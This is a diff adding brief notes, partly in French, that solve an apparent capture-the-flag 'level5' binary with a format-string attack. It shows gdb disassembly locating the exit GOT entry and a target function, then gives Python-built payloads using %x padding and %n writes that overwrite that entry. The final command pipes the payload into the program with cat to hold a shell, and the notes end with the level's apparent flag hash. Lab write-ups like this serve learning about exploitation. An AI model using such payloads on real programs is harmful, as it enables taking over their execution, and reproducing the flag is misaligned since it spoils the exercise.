@@ -1,0 +1,17 @@
+In gdb we can see:
+0x080484ff <+61>:	call   0x80483d0 <exit@plt> 
+disas 0x80483d0
+we can see  0x080483d0 <+0>:	jmp    *0x8049838
+disas o
+0x080484a4 <+0>:	push   %ebp
+It's possible to have the format printf vulnerability so the question is 
+it is possible to change the value of call 08049838 to 080484a4?
+Yes its possible with this
+https://samsclass.info/127/proj/p6-fs.htm
+(gdb) run <<< $(python -c 'print "\x38\x98\x04\x08" + " %x %x %x %n"') => permet d'ecrire sur cet espace memoire mais on doit ecrire sur tous les espaces memoires donc
+$(python -c 'print "\x38\x98\x04\x08" + "\x39\x98\x04\x08\x3a\x98\x04\x08\x3b\x98\x04\x08"" %x %x %x %n %n %n %n"') => permet d ecrire sur chaque hexa de la memoire
+On met chaque address pour overwrite l'adress exit sur l'address o avec FUNK pour permettre de mettre l'hexa de notre choix.
+$(python -c 'print "\x38\x98\x04\x08FUNK" + "\x39\x98\x04\x08FUNK\x3a\x98\x04\x08FUNK\x3b\x98\x04\x08"" %x %x %121x %n %222x %n %126x %n %258x %n"') => ecrit 080484a4 sur le memoire de exit
+donc 
+(python -c 'print "\x38\x98\x04\x08FUNK" + "\x39\x98\x04\x08FUNK\x3a\x98\x04\x08FUNK\x3b\x98\x04\x08"" %x %x %121x %n %222x %n %126x %n %258x %n"'; cat) | ./level5
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
